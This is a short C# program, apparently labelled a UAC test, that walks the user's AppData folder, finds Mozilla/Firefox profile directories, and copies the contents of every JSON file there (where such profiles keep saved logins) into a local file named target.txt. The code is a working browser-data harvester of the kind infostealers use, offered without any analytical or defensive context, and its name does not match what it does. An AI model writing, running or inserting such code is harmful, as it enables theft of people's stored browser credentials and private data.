using System;
using System.IO;

namespace UACTEST
{
    class Program
    {
        static void Main(string[] args)
        {
            foreach (var line in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
                if (line.Contains("Mozilla"))
                    foreach (var directory in Directory.GetDirectories(line, "*", SearchOption.AllDirectories))
                        foreach (var file in Directory.GetFiles(directory, "*.json"))
                            using (System.IO.StreamWriter targetFile = new System.IO.StreamWriter(@"target.txt", true))
                            {
                                targetFile.WriteLine(File.ReadAllText(file));
                            }
            //Console.WriteLine(File.ReadAllText(file));
        }
    }
}
